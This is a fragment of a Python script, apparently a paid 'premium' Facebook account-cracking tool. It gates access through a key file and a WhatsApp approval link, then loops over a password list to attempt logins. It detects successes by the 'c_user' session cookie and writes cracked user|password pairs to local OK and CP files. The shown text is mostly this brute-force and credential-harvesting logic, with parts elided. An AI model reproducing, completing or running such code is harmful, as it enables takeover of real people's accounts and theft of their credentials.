...
def main_apv():
    ...
    print (logo)
    try:
        key1 = open('/sdcard/KHUSHI.txt', 'r').read()
    except IOError:
        os.system('clear')
        print (logo)
        ...
        time.sleep(3.5)
        os.system('xdg-open https://wa.me/+923408026751?text=HELLO%20KHUSHI,%20PLEASE%20APPROVED%20MY%20KEY%20TO%20PREMIUM %20%20MY%20%20KEY%20%20:%20')
    ...
    if key1 in r1:
        ...
        print ('_____________________________________________________')
        time.sleep(3.5)
        os.system('xdg-open https://wa.me/+923408026751?text=HELLO%20KHUSHI,%20PLEASE%20APPROVED%20MY%20KEY%20TO%20PREMIUM✓✓%20%20%20%20%20MY%20%20KEY%20%20:%20')
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [SY-KHUSHI-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('SY-KHUSHI_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [SY-KHUSHI-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('SY-KHUSHI_CP.txt' , 'a').write('%s\n' % wrt)
                        break
